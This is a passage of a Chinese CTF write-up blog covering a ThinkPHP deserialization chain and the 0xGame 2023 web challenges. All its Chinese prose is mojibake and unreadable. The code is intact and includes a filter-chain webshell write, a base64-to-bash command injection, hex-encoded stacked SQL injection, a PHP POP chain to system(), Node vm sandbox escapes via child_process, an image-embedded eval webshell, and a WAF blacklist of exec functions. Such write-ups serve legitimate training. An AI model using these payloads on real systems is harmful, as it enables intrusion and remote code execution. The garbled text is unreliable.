ä¹Ÿå°±æ˜¯æ–‡ä»¶å†…å®¹`$data`æˆ‘ä»¬ä¸å¯æ§ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387750421-cc16d9f2-abcd-4aae-b13b-45c0f2ea3ba7.png)\n\nç»§ç»­åˆ†æè¿™é‡Œä¼šè°ƒç”¨setTagItemè¿™ä¸ªå‡½æ•° æˆ‘ä»¬è·Ÿè¿›è§‚å¯Ÿ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387860334-4f4aa100-87e2-40ed-8cbe-64c36ed272a7.png)\n\nè¯¥å‡½æ•°åˆä¼šè°ƒç”¨ä¸€æ¬¡setå‡½æ•° é‚£ä¹ˆæ­¤æ—¶`$value`çš„å€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ ä¹Ÿå°±æ˜¯ä¼ è¿›æ¥çš„`$name`ä¹Ÿå°±æ˜¯`$filename`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387939980-8e0ce116-2027-4287-a7db-6b69ee7afffb.png)\n\né‚£ä¹ˆæ­¤æ—¶ä¼ å…¥setçš„`$name`ä¸º`$key=tag_c4ca4238a0b923820dcc509a6f75849b`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702388521425-d31d2d3d-c5e0-4c87-8991-4cc6f1569117.png)\n\nä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ å°±æ˜¯exit()æ­»äº¡å‡½æ•°çš„ç»•è¿‡ æˆ‘ä»¬å†™å…¥æ–‡ä»¶çš„å†…å®¹å—åˆ°è¿™ä¸ªå‡½æ•°çš„å½±å“\n\nå¹¶ä¸”å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„æ–‡ä»¶å å› æ­¤åªéœ€è¦æˆ‘ä»¬å°†æ–‡ä»¶åæ„é€ ä¸ºç‰¹æ®Šçš„å¯ä»¥åæ‰exit()çš„ç¼–ç å³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702388214099-8cb10a8d-65bb-4999-98b7-64f2f9e0a06d.png)\n\næ‰€ä»¥ä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ åªæœ‰ç¬¬äºŒä¸ªæ–‡ä»¶å†…å®¹æ‰æ˜¯æˆ‘ä»¬æƒ³è¦çš„\n\nå¹¶ä¸”ç¬¬äºŒä¸ªæ–‡ä»¶åä¸º`\"php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php3b58a9545013e88c7186db11bb158c44.php\"+md5(tag_c4ca4238a0b923820dcc509a6f75849b).php`\n\näº§å‡ºçš„æ–‡ä»¶åä¸ºï¼š`a.php3b58a9545013e88c7186db11bb158c44.php`\n\nè¿™é‡Œæ–‡ä»¶åä¹Ÿæœ‰è®²ç©¶ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„æ–‡ä»¶ååº”è¯¥æ˜¯`aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php3b58a9545013e88c7186db11bb158c44.php\"+md5(tag_c4ca4238a0b923820dcc509a6f75849b).php`è¿™ä¸€å¨æ‰å¯¹ \n\næœ€åä¸ºä»€ä¹ˆåªç”Ÿæˆäº†æˆ‘ä»¬æƒ³è¦çš„`a.php3b58a9545013e88c7186db11bb158c44.php`\n\næˆ‘ä»¬å°†å‰é¢çš„ä¸€ä¸²base64å­—ç¬¦æ•´ä½“çœ‹ä½œä¸€ä¸ªç›®å½•ï¼Œè™½ç„¶æ²¡æœ‰ï¼Œä½†æ˜¯æˆ‘ä»¬åé¢é‡æ–°æ’¤å›äº†åŸç›®å½•ï¼Œç”Ÿæˆ`a.php3b58a9545013e88c7186db11bb158c44.php`æ–‡ä»¶ï¼Œä»è€Œå°±å¯ä»¥ç”Ÿæˆæ­£å¸¸çš„æ–‡ä»¶åã€‚\n\nå‚è€ƒï¼š[æ¢ç´¢phpä¼ªåè®®ä»¥åŠæ­»äº¡ç»•è¿‡ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·](https://www.freebuf.com/articles/web/266565.html)\n\nè‡³æ­¤åˆ†æå®Œç¾æ’’èŠ±\n\n# ç»“å°¾\n\nä¸èƒ½åªæ˜¯ä¸€å‘³çš„ä¸ºäº†è§£é¢˜è€Œå»åˆ·é¢˜ä¸å»æ·±ç©¶çœŸæ­£çš„æ¼æ´åŸå› \n\nçœ‹äº†å¾ˆå¤šå‰å®³å¸ˆå‚…çš„åšå®¢ æ·±æ·±çš„eä½äº†\n\nä¸æŠŠå±ä¸€æ ·çš„ä¸œè¥¿æ¬å‡ºæ¥æŠ½è±¡äº† æ”¾åœ¨é›¨é›€ä¸Šè‡ªå·±çœ‹çœ‹å°±å¥½äº†\n\nè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœäº†åšå®¢ä¸€ä¸ªæœˆäº†qwqï¼Œæ·±æ€ä¸­ã€‚ã€‚ã€‚\n\nè¿˜æœ‰å°±æ˜¯æœŸæœ«äº† ä¹Ÿe è¦ç»™æ—¶é—´å¤ä¹ äº†\n\n# å‚è€ƒï¼š\n\n[ThinkPHP5.xååºåˆ—åŒ–æ¼æ´å…¨å¤ç° - Boogiepop Doesnâ€™t Laugh](https://boogipop.com/2023/03/02/ThinkPHP5.xååºåˆ—åŒ–æ¼æ´å…¨å¤ç°/#äº”ã€ThinkPHP5-0-xååºåˆ—åŒ–é“¾)\n\n[thinkphp5.1.x~5.2.xç‰ˆæœ¬ååºåˆ—åŒ–é“¾æŒ–æ˜åˆ†æ - å…ˆçŸ¥ç¤¾åŒº](https://xz.aliyun.com/t/6619#toc-1)\n\n[æ¢ç´¢phpä¼ªåè®®ä»¥åŠæ­»äº¡ç»•è¿‡ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·](https://www.freebuf.com/articles/web/266565.html)\n","categories":["-æ¼æ´å¤ç°"]},{"title":"0xgame2023 webå¤ç°å­¦ä¹ ","url":"/post/7a0dbac6.html","content":"\n0xgameå¸ˆå‚…ä»¬å‡ºçš„é¢˜ç›®è´¨é‡çœŸçš„å¾ˆé«˜ å­¦ä¹ å­¦ä¹ ï¼\n    <!--more-->\n\n# WEEK1\n\n## [Week 1] signin\n\næ‰¾jæºç å°±æœ‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696128791084-a0ea71f9-f12e-45cf-a069-46d8e6a40e9f.png)\n\n## [Week 1] hello_http\n\nç»å…¸è€ƒå¯Ÿhttpåè®®\n\n```java\nPOST /?query=ctf HTTP/1.1\nHost: 124.71.184.68:50012\nContent-Length: 14\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nOrigin: http://124.71.184.68:50012\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: HarmonyOS Browser\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: ys.mihoyo.com\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nX-Forwarded-For: 127.0.0.1\nCookie: role=admin\nConnection: close\n\naction=getflag\n```\n\n## [Week 1] baby_php\n\nç»å…¸é¢˜å‹ æ³¨æ„ä¸€ä¸‹è¿™é‡Œå°±æ˜¯è¦ç”¨ä¼ªåè®®å»è¯» åˆ«ç›´æ¥åŒ…å«flagé‚£æ ·è¯»ä¸å‡ºæ¥çš„\n\n```java\nPOST /?a=QNKCDZO&b=240610708 HTTP/1.1\nHost: 120.27.148.152:50014\nContent-Length: 11\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nOrigin: http://120.27.148.152:50014\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://120.27.148.152:50014/?a=QNKCDZO&b=240610708\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: name=php://filter/read=convert.base64-encode/resource=flag\nConnection: close\n\nc=1024.1%00\n```\n\n\n\n## [Week 1] ping\n\nç–‘ä¼¼è¢«æ…å±äº†\n\n```java\n<?php\n\nfunction sanitize($s) {\n    $s = str_replace(';', '', $s);\n    $s = str_replace(' ', '', $s);\n    $s = str_replace('/', '', $s);\n    $s = str_replace('flag', '', $s);\n    return $s;\n}\n\nif (isset($_GET['source'])) {\n    highlight_file(__FILE__);\n    die();\n}\n\nif (!isset($_POST['ip'])) {\n    die('No IP Address');\n}\n\n$ip = $_POST['ip'];\n\n$ip = sanitize($ip);\n\nif (!preg_match('/((\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.){3}(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])/', $ip)) {\n    die('Invalid IP Address');\n}\n\nsystem('ping -c 4 '.$ip. ' 2>&1');\n\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696132566678-8a6865cd-dbef-41e2-ad6e-73f8a03baef2.png)\n\næ²¡æ…å±çš„payload:\n\nç”¨base64ç¼–ç ç»•è¿‡å°±è¡Œ\n\n```java\nip=127.0.0.1|echo${IFS}\"Y2F0IC9mKg==\"|base64${IFS}-d|bash\n```\n\n## [Week 1] repo_leak\n\nè¦ç”¨è¿™ä¸ªå·¥å…·æ‰èƒ½æ‰¾åˆ°gitæ³„éœ²https://github.com/gakki429/Git_Extract\n\ngithackæ‹‰å–ä¸åˆ°\n\nç„¶åç¿»æºç èƒ½æ‰¾åˆ°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696134140917-f87d509a-66bf-4a36-aa10-a94c2ff9944a.png)\t \n\n\n\n# WEEK2\n\næ“ä½ å¦ˆä¸çŸ¥é“æ˜¯æˆ‘è¿™é‡Œæ ¡å›­ç½‘çš„åŸå›  ç¯å¢ƒä¸€ç›´åƒç‹—å±ä¸€æ ·æ¶å¿ƒæˆ‘\n\næ–‡ä»¶ä¸Šä¼ ä¸€ç›´è®¿é—®ä¸åˆ°æ–‡ä»¶ sqlæ³¨å…¥ä¸€ç›´è½¬åœˆé“¾æ¥å¤±è´¥\n\n## [Week 2] ez_upload\n\nè€ƒç‚¹:\n\n- äºŒæ¬¡æ¸²æŸ“\n\nhttps://github.com/hxer/imagecreatefrom-/tree/master é¡¹ç›®åœ°å€\n\néœ€è¦æ³¨æ„ï¼š\n\n- pocç¯å¢ƒè¦åœ¨python2\n- ç”Ÿæˆè¯­å¥`python2 poc_png.py -p '<?php @eval($_POST[x]);?>' -o ç›®æ ‡ç…§ç‰‡filename test.png(å¥½åƒæ˜¯æ¨¡æ¿)`\n\n\n\n## [Week 2] ez_sqli\n\nè€ƒç‚¹:\n\n- å †å æ³¨å…¥\n- é¢„å¤„ç†\n- æŠ¥é”™æ³¨å…¥\n\npayloadï¼š\n\n```java\n?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C646174616261736528292929;prepare/**/aaa/**/from @c;execute/**/aaa;\n?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2853454C4543542047726F75705F636F6E636174287461626C655F6E616D65292046524F4D20696E666F726D6174696F6E5F736368656D612E7461626C6573205748455245207461626C655F736368656D61203D2027637466272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;\n?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F736368656D613D276374662720616E64207461626C655F6E616D653D27666C6167272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;\n?order=id;set/**/@c=0x73656c656374206578747261637476616c756528312c636f6e63617428307837652c307837652c737562737472282873656c65637420666c61672066726f6d206374662e666c6167292c312c33302929293b;prepare/**/aaa/**/from @c;execute/**/aaa;\n```\n\néœ€è¦æ³¨æ„çš„å‡ ä¸ªç‚¹æ˜¯:\n\n- `0xå­—ç¬¦ä¸²`æ˜¯é¢„å¤„ç†è¯­å¥çš„å­—ç¬¦è½¬16è¿›åˆ¶\n- æœ€åæŠ¥é”™æ³¨å…¥è·å¾—flagçš„æ—¶å€™è¦åˆ©ç”¨substrå‡½æ•°æˆªå–flag ä¸ç„¶æ˜¾ç¤ºä¸å…¨\n- è¯­å¥é—´è™½ç„¶æ²¡æœ‰banç©ºæ ¼ä½†æ˜¯ç©ºæ ¼ä¼šè¢«tun è¿˜æ˜¯ç»™æ›¿æ¢äº†ã€‚ã€‚ åæ­£`/**/`ç»•ä¸€ä¸‹\n\n## [Week 2] ez_unserialize\n\n```java\n<?php\n\nshow_source(__FILE__);\n\nclass Cache {\n    public $key;\n    public $value;\n    public $expired;\n    public $helper;\n\n    public function __construct($key, $value, $helper) {\n        $this->key = $key;\n        $this->value = $value;\n        $this->helper = $helper;\n\n        $this->expired = False;\n    }\n\n    public function __wakeup() {\n        $this->expired = False;\n    }\n\n    public function expired() {\n        if ($this->expired) {\n            $this->helper->clean($this->key);\n            return True;\n        } else {\n            return False;\n        }\n    }\n}\n\nclass Storage {\n    public $store;\n\n    public function __construct() {\n        $this->store = array();\n    }\n    \n    public function __set($name, $value) {\n        if (!$this->store) {\n            $this->store = array();\n        }\n\n        if (!$value->expired()) {\n            $this->store[$name] = $value;\n        }\n    }\n\n    public function __get($name) {\n        return $this->data[$name];\n    }\n}\n\nclass Helper {\n    public $funcs;\n\n    public function __construct($funcs) {\n        $this->funcs = $funcs;\n    }\n\n    public function __call($name, $args) {\n        $this->funcs[$name](...$args);\n    }\n}\n\nclass DataObject {\n    public $storage;\n    public $data;\n\n    public function __destruct() {\n        foreach ($this->data as $key => $value) {\n            $this->storage->$key = $value;\n        }\n    }\n}\n\nif (isset($_GET['u'])) {\n    unserialize($_GET['u']);\n}\n?>\n```\n\nä¸€å¼€å§‹å¯¹è¿™é‡Œæœ‰ç‚¹é™Œç”Ÿ è‡ªå·±ä¸¾ä¸ªä¾‹å­ç†è§£ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696860418282-2b207032-929a-4a0c-b3e2-98bf59c8ba6b.png)\n\nå¦‚æœè¿™æ˜¯`$this->data`æ˜¯ä¸ªæ•°ç»„ é‚£ä¹ˆå°±å¾ˆå¥½ç†è§£äº† è®°å½•ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696860466228-d3470799-1f0a-41bb-bf4b-516a1c4f8704.png)\n\nç„¶åæ˜¯popé“¾æ„é€ \n\n```java\n<?php\n\nclass Cache {\n    public $key;\n    public $value;\n    public $expired;\n    public $helper;\n}\nclass Storage {\n    public $store;\n}\nclass Helper {\n    public $funcs;\n}\nclass DataObject {\n    public $storage;\n    public $data;\n}\n$a = new DataObject();\n$a->storage = new Storage();\n$b = new Cache();\n$a->data = [\"Z1d10t\"=>$b];\n$b->expired = 1;\n$b->helper = new Helper();\n$b->helper->funcs = [\"clean\"=>\"system\"];\n$b->key = 'env';\necho serialize($a);\n?>\n```\n\næ³¨æ„ï¼š\n\n- è¿™é‡Œèµ‹å€¼æ•°ç»„æ—¶å€™ä¸èƒ½ç”¨`array(\"1\"=>\"1\");` è¦ç”¨`[\"1\"=>\"1\"] ` å®æµ‹ç¬¬ä¸€ç§ä¼šæ–­å¼€é“¾å­\n- expiredå‡½æ•°è°ƒç”¨åœ¨è¿™é‡Œ å¾ˆå¾®å¦™ å®¹æ˜“å¿½ç•¥![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696862014638-0334abee-df42-4565-9ab4-ad31e89c3f51.png)\n\n## [WEEK2]ez_sandbox\n\nä¸€é“åŸå‹é“¾æ±¡æŸ“+vmæ²™ç›’é€ƒé€¸çš„é¢˜ç›®\n\næºç å¦‚ä¸‹ï¼š\n\n```go\nconst crypto = require('crypto')\nconst vm = require('vm');\n\nconst express = require('express')\nconst session = require('express-session')\nconst bodyParser = require('body-parser')\n\nvar app = express()\n\napp.use(bodyParser.json())\napp.use(session({\n    secret: crypto.randomBytes(64).toString('hex'),\n    resave: false,\n    saveUninitialized: true\n}))\n\nvar users = {}\nvar admins = {}\n\nfunction merge(target, source) { //æ±¡æŸ“å‡½æ•°\n    for (let key in source) {\n        if (key === '__proto__') {\n            continue\n        }\n        if (key in source && key in target) {\n            merge(target[key], source[key])\n        } else {\n            target[key] = source[key]\n        }\n    }\n    return target\n}\n\nfunction clone(source) { //è°ƒç”¨æ±¡æŸ“å‡½æ•°ç‚¹\n    return merge({}, source)\n}\n\nfunction waf(code) {\n    let blacklist = ['constructor', 'mainModule', 'require', 'child_process', 'process', 'exec', 'execSync', 'execFile', 'execFileSync', 'spawn', 'spawnSync', 'fork']\n    for (let v of blacklist) {\n        if (code.includes(v)) {\n            throw new Error(v + ' is banned')\n        }\n    }\n}\n\nfunction requireLogin(req, res, next) {\n    if (!req.session.user) {\n        res.redirect('/login')\n    } else {\n        next()\n    }\n}\n\napp.use(function(req, res, next) {\n    for (let key in Object.prototype) {\n        delete Object.prototype[key]\n    }\n    next()\n})\n\napp.get('/', requireLogin, function(req, res) {\n    res.sendFile(__dirname + '/public/index.html')\n})\n\napp.get('/login', function(req, res) {\n    res.sendFile(__dirname + '/public/login.html')\n})\n\napp.get('/register', function(req, res) {\n    res.sendFile(__dirname + '/public/register.html')\n})\n\napp.post('/login', function(req, res) {\n    let { username, password } = clone(req.body)\n\n    if (username in users && password === users[username]) {\n        req.session.user = username\n\n        if (username in admins) {\n            req.session.role = 'admin'\n        } else {\n            req.session.role = 'guest'\n        }\n\n        res.send({\n            'message': 'login success'\n        })\n    } else {\n        res.send({\n            'message': 'login failed'\n        })\n    }\n})\n\napp.post('/register', function(req, res) {\n    let { username, password } = clone(req.body)\n\n    if (username in users) {\n        res.send({\n            'message': 'register failed'\n        })\n    } else {\n        users[username] = password\n        res.send({\n            'message': 'register success'\n        })\n    }\n})\n\napp.get('/profile', requireLogin, function(req, res) {\n    res.send({\n        'user': req.session.user,\n        'role': req.session.role\n    })\n})\n\napp.post('/sandbox', requireLogin, function(req, res) {\n    if (req.session.role === 'admin') {\n        let code = req.body.code\n        let sandbox = Object.create(null)\n        let context = vm.createContext(sandbox)\n        \n        try {\n            waf(code)\n            let result = vm.runInContext(code, context)\n            res.send({\n                'result': result\n            })\n        } catch (e) {\n            res.send({\n                'result': e.message\n            })\n        }\n    } else {\n        res.send({\n            'result': 'Your role is not admin, so you can not run any code'\n        })\n    }\n})\n\napp.get('/logout', requireLogin, function(req, res) {\n    req.session.destroy()\n    res.redirect('/login')\n})\n\napp.listen(3000, function() {\n    console.log('server start listening on :3000')\n})\n```\n\né¦–å…ˆéœ€è¦åŸå‹é“¾æ±¡æŸ“è®©æˆ‘ä»¬ä»¥adminèº«ä»½ç™»å½•\n\nè¿™é‡Œç¦ç”¨äº†__proto__\n\næ‰€ä»¥è¿™é‡Œå¯ä»¥é€šè¿‡`constructor.prototype`æ¥bypass\n\nå› ä¸º`__proto__=constructor.prototype`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697265247445-5346a095-844e-4832-8980-ad26201c773d.png)\n\nä¹‹åå°±æ˜¯vmæ²™ç›’é€ƒé€¸ å‚è€ƒ[NodeJS VMå’ŒVM2æ²™ç®±é€ƒé€¸ - å…ˆçŸ¥ç¤¾åŒº](https://xz.aliyun.com/t/11859#toc-4)\n\nå› ä¸ºthisä¸ºnull\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697288378181-1f6cf69e-9bf6-4984-b92f-951579eee84d.png)\n\næ‰€ä»¥æˆ‘ä»¬è¦ç”¨åˆ°ä¸€ä¸ªå‡½æ•°ä¸­çš„å†…ç½®å¯¹è±¡çš„å±æ€§`arguments.callee.caller`ï¼Œå®ƒå¯ä»¥è¿”å›å‡½æ•°çš„è°ƒç”¨è€…ã€‚\n\næˆ‘ä»¬åªè¦åœ¨æ²™ç®±å†…å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç„¶ååœ¨æ²™ç®±å¤–è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°çš„`arguments.callee.caller`å°±ä¼šè¿”å›æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…å°±å¯ä»¥è¿›è¡Œé€ƒé€¸äº†\n\né™¤æ­¤ä¹‹å¤–è¿™é“é¢˜æ²™ç®±æ²¡æœ‰è¿”å›å€¼ æˆ‘ä»¬å¯ä»¥å€ŸåŠ©å¼‚å¸¸ï¼Œå°†æ²™ç®±å†…çš„å¯¹è±¡æŠ›å‡ºå»ï¼Œç„¶ååœ¨å¤–éƒ¨è¾“å‡º\n\nåœ¨æ²™ç®±å†…å¯ä»¥é€šè¿‡ throw æ¥æŠ›å‡ºä¸€ä¸ªå¯¹è±¡ è¿™ä¸ªå¯¹è±¡ä¼šè¢«æ²™ç®±å¤–çš„ catch è¯­å¥æ•è· ç„¶åä¼šè®¿é—®å®ƒçš„ message å±æ€§ (å³ e.message)\né€šè¿‡ JavaScript çš„ Proxy ç±»æˆ–å¯¹è±¡çš„ __defineGetter__ æ–¹æ³•æ¥è®¾ç½®ä¸€ä¸ª getter ä½¿å¾—åœ¨æ²™ç®±å¤–è®¿é—® e çš„ message å±æ€§ (å³ e.message) æ—¶èƒ½å¤Ÿè°ƒç”¨æŸä¸ªå‡½æ•°\n\né™¤æ­¤ä¹‹å¤–è¿˜è¦ç»•ä¸€ä¸‹waf\n\nè¿™é‡Œæä¾›ä¸¤ç§paylaod \n\nbypasså§¿åŠ¿å‚è€ƒï¼š[nodejsä¸­ä»£ç æ‰§è¡Œç»•è¿‡çš„ä¸€äº›æŠ€å·§-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°](https://www.anquanke.com/post/id/237032#h3-3)[å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-NodeJSä¸­çš„RCEçš„åˆ©ç”¨å’Œç»•è¿‡](https://forum.butian.net/share/1631)\n\n```javascript\n#ç¬¬ä¸€ç§åˆ©ç”¨æ¨¡æ¿å­—ç¬¦ä¸²\n  throw new Proxy({}, {\n    get: function(){\n      const cc = arguments.callee.caller;\n      const p = (cc[`${`constructo`}r`][`${`constructo`}r`](`return ${`proces`}s`))();\n      return p[`${`mainModul`}e`][`${`requir`}e`]('child_pr'+'ocess')[`${`exe`}cSync`}`]('id').toString();\n}\n})\n#ç¬¬äºŒç§åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥\nthrow new Proxy({}, {\n        get: function(){\n            const cc = arguments.callee.caller;\n            const p = (cc['const'+'ructor']['cons'+'tructor']('return pr'+'ocess'))();\n            return p['mai'+'nModule']['re'+'quire']('child_p'+'rocess')['exe'+'cSync']('cat /f*').toString();\n        }\n    })\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697288660433-2c0dc5cd-e4fe-41c6-abf5-097466e5fde7.png)\n\n\n\n# WEEK3\n\n## [Week 3] notebook\n\nè€ƒç‚¹ï¼š\n\n- pickleååºåˆ—åŒ–\n\næºç å¦‚ä¸‹ï¼š\n\n```javascript\nfrom flask import Flask, request, render_template, session\nimport pickle\nimport uuid\nimport os\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = os.urandom(2).hex()\n\nclass Note(object):\n    def __init__(self, name, content):\n        self._name = name\n        self._content = content\n\n    @property\n    def name(self):\n        return self._name\n    \n    @property\n    def content(self):\n        return self._content\n\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n\n@app.route('/<path:note_id>', methods=['GET'])\ndef view_note(note_id):\n    notes = session.get('notes')\n    if not notes:\n        return render_template('note.html', msg='You have no notes')\n    \n    note_raw = notes.get(note_id)\n    if not note_raw:\n        return render_template('note.html', msg='This note does not exist')\n    \n    note = pickle.loads(note_raw)\n    return render_template('note.html', note_id=note_id, note_name=note.name, note_content=note.content)\n\n\n@app.route('/add_note', methods=['POST'])\ndef add_note():\n    note_name = request.form.get('note_name')\n    note_content = request.form.get('note_content')\n\n    if note_name == '' or note_content == '':\n        return render_template('index.html', status='add_failed', msg='note name or content is empty')\n    \n    note_id = str(uuid.uuid4())\n    note = Note(note_name, note_content)\n\n    if not session.get('notes'):\n        session['notes'] = {}\n    \n    notes = session['notes']\n    notes[note_id] = pickle.dumps(note)\n    session['notes'] = notes\n    return render_template('index.html', status='add_success', note_id=note_id)\n\n\n@app.route('/delete_note', methods=['POST'])\ndef delete_note():\n    note_id = request.form.get('note_id')\n    if not note_id:\n        return render_template('index.html')\n    \n    notes = session.get('notes')\n    if not notes:\n        return render_template('index.html', status='delete_failed', msg='You have no notes')\n    \n    if not notes.get(note_id):\n        return render_template('index.html', status='delete_failed', msg='This note does not exist')\n    \n    del notes[note_id]\n    session['notes'] = notes\n    return render_template('index.html', status='delete_success')\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000, debug=False)\n```\n\nå¤§è‡´å®¡è®¡ä¸€ä¸‹ \n\nå¤§è‡´æ€è·¯ä¸º`/add_note`ä¸‹ä¼šå°†æˆ‘ä»¬æäº¤çš„æ•°æ®è¿›è¡Œpickleåºåˆ—åŒ– å†…å®¹ä¿å­˜åœ¨sessionä¸­\n\nç„¶ååœ¨`/<path:note_id>`è¿›è¡Œpickleååºåˆ—åŒ–\n\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶session å°†é‡Œé¢çš„æ­£å¸¸åºåˆ—åŒ–æ•°æ®æ”¹ä¸ºæ¶æ„æ•°æ® é‚£ä¹ˆå°±å¯ä»¥å®ç°RCEäº†\n\né‡åˆ°çš„ä¸€äº›é—®é¢˜ï¼š\n\n1. é¦–å…ˆæ˜¯flask_unsignè„šæœ¬çˆ†ç ´sercetçš„é—®é¢˜ è¿™ä¸ªè„šæœ¬éœ€è¦æœ€åŸå§‹çš„sessionæ¥è¿›è¡Œçˆ†ç ´ å¦‚æœæ˜¯æäº¤äº†ä»»ä½•å‚æ•°çš„sessionéƒ½ä¼šçˆ†ä¸å‡ºsecret\n2. å› ä¸ºæˆ‘ä»¬opcodeåŠ ä¸Šæˆ‘ä»¬çš„payloadä¸€èˆ¬è¿˜æœ‰ä¸€äº›ç‰¹æ®Šå­—ç¬¦æ¯”å¦‚`/ &`é‚£ä¹ˆè¿›è¡Œä¼ªé€ sessionçš„æ—¶å€™å°±ä¼šæ¶‰åŠåˆ°è½¬ä¹‰çš„é—®é¢˜ è½¬ä¹‰å¤´éƒ½å¤§äº† è¿™é‡ŒAecouså¸ˆå‚…æä¾›äº†ä¸€ç§å¥½çš„æ–¹æ³• å¯ä»¥ç°åœ¨è‡ªå·±æœ¬åœ°æ­å»ºå¥½é¢˜ç›® ç„¶åä¿®æ”¹ç›¸å…³ç”Ÿæˆçš„sessionçš„å‚æ•° è®©é¢˜ç›®è‡ªå·±å»å¤„ç†sessionè½¬ä¹‰é—®é¢˜ ç„¶åç›´æ¥æœ¬åœ°è·å–å«æ¶æ„payloadçš„sessionç„¶åå†æäº¤ç»™é¢˜ç›® ï¼ˆè®°å¾—æœ¬åœ°secret_keyä¹Ÿè¦ä¿æŒå’Œé¢˜ç›®ä¸€è‡´ ï¼‰![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697614101618-a7dbef85-9523-4e2f-a60a-72a72819d305.png)\n3. å…³äºRæŒ‡ä»¤çš„é—®é¢˜è¿™ä¸ªé¢˜ç›®å¥½åƒRæŒ‡ä»¤ç¨ç¨æœ‰ç‚¹é—®é¢˜å¯¼è‡´æ²¡æ³•å¼¹å›payload å¯ä»¥è¯•ç€ç”¨å…¶ä»–æŒ‡ä»¤æ¯”å¦‚æˆ‘ç”¨çš„æ˜¯iæŒ‡ä»¤  ï¼ˆå›æ¥è¡¥å‘äº† å› ä¸ºç”¨pickle.dumps()  æ¥ç”Ÿæˆ payload, ä¸åŒæ“ä½œç³»ç»Ÿâ½£æˆçš„ pickle åºåˆ—åŒ–æ•°æ®æ˜¯æœ‰åŒºåˆ«çš„   å› æ­¤æˆ‘ä»¬windowsç”Ÿæˆçš„payloadåœ¨linuxç”¨ä¸äº† å‚è€ƒï¼š[pickleååºåˆ—åŒ–åˆæ¢ - å…ˆçŸ¥ç¤¾åŒº](https://xz.aliyun.com/t/7436)ï¼‰\n\n\n\n\n\n\n\n## [Week 3] rss_parser\n\næºç å¦‚ä¸‹ï¼š\n\n```javascript\nfrom flask import Flask, render_template, request, redirect\nfrom urllib.parse import unquote\nfrom lxml import etree\nfrom io import BytesIO\nimport requests\nimport re\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'GET':\n        return render_template('index.html')\n    else:\n        feed_url = request.form['url']\n        if not re.match(r'^(http|https)://', feed_url):\n            return redirect('/')\n\n        content = requests.get(feed_url).content\n    